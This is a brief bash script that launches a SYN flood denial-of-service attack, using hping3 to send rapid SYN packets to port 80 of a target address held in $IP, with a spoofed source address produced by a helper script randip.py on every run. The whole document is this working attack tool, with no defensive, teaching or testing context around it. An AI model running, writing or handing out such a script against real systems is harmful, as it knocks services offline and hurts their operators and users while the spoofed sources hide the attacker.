#!/bin/bash

echo "Executing SYN Flood ..."
flood () {
  hping3 $IP -a $(python3 ./randip.py) -p 80 -S --faster
}

flood